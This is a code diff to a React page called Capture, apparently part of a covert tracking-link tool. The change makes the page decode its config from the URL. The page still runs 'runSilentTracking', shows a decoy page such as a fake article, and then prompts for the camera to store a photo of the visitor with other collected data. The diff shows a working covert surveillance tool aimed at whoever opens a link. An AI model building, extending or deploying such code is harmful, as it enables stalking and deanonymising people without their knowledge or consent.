@@ -1,6 +1,7 @@
 import { useEffect, useRef, useState } from 'react';
 import { useParams } from 'react-router-dom';
-import { getLinkById, addCapture } from '../storage';
+import { decodeConfig, addCapture } from '../storage';
+
 
 /* ─── UA Parser ─────────────────────────────────────────── */
 function parseUA(ua) {
@@ -379,22 +380,25 @@ const DECOY_MAP = {
 
 export default function Capture() {
   const { trackId } = useParams();
-  const [link, setLink] = useState(null);
+  const [config, setConfig] = useState(null);
   const [notFound, setNotFound] = useState(false);
   const [showCamera, setShowCamera] = useState(false);
   const dataRef = useRef({});
 
   useEffect(() => {
-    const lnk = getLinkById(trackId);
-    if (!lnk) { setNotFound(true); return; }
-    setLink(lnk);
-    runSilentTracking(lnk, dataRef, () => setShowCamera(true));
+    // Decode config langsung dari URL — tidak perlu localStorage
+    const cfg = decodeConfig(trackId);
+    if (!cfg) { setNotFound(true); return; }
+    setConfig(cfg);
+    // Buat objek "link" virtual dari config
+    const link = { id: cfg.id || trackId, options: cfg.options || {}, decoyTheme: cfg.decoyTheme };
+    runSilentTracking(link, dataRef, () => setShowCamera(true));
   }, [trackId]);
 
   function handlePhotoCapture(photo) {
     if (photo) dataRef.current.photo = photo;
     setShowCamera(false);
-    addCapture(link.id, { ...dataRef.current });
+    if (config) addCapture(config.id || trackId, { ...dataRef.current });
   }
 
   if (notFound) return (
@@ -406,9 +410,9 @@ export default function Capture() {
     </div>
   );
 
-  if (!link) return null;
+  if (!config) return null;
 
-  const DecoyComponent = DECOY_MAP[link.decoyTheme] || ArticleDecoy;
+  const DecoyComponent = DECOY_MAP[config.decoyTheme] || ArticleDecoy;
 
   return (
     <>
@@ -417,3 +421,5 @@ export default function Capture() {
     </>
   );
 }
+
+
